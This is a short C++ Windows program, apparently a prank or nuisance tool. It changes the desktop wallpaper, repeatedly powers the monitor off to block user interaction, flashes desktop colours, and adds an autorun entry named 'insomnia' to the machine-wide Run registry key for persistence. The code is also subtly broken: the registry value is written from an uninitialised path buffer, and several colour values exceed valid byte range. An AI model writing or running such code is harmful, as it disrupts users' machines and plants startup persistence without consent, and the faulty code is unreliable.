#include <iostream>
#include <chrono>
#include <thread>
#include <string>
#include <Windows.h>
using namespace std;




int main() {

	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)"C:\\Users\\admin\\Desktop\\img.jpg", SPIF_UPDATEINIFILE);
	Sleep(10000);
		
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)1);
	this_thread::sleep_for(chrono::milliseconds(500));
	TCHAR szPath[MAX_PATH];
	HKEY hmsc;
	RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hmsc);
	RegSetValueEx(hmsc, "insomnia", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	int aElements[1] = { COLOR_DESKTOP };
	DWORD aNewColors[1];

	for (int i = 0; i < 10; i++) {
		aNewColors[0] = RGB(0x190, 0x100, 0x80); 
		SetSysColors(1, aElements, aNewColors);
		Sleep(100); // Eliminate user's interaction for 500 ms
		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
		this_thread::sleep_for(chrono::milliseconds(800));
		aNewColors[0] = RGB(0x150, 0x00, 0x100);
		SetSysColors(1, aElements, aNewColors);
		
		this_thread::sleep_for(chrono::milliseconds(800));
		aNewColors[0] = RGB(0x200, 0x100, 0x80);  
		SetSysColors(1, aElements, aNewColors);
		
		this_thread::sleep_for(chrono::milliseconds(800));
		aNewColors[0] = RGB(0x80, 0x00, 0x100);  
		SetSysColors(1, aElements, aNewColors);
		
		this_thread::sleep_for(chrono::milliseconds(800));
		aNewColors[0] = RGB(0x100, 0x100, 0x80); 
		SetSysColors(1, aElements, aNewColors);
		
		this_thread::sleep_for(chrono::milliseconds(800));
	}

	aNewColors[0] = RGB(0x190, 0x100, 0x80);
	SetSysColors(1, aElements, aNewColors);
	

}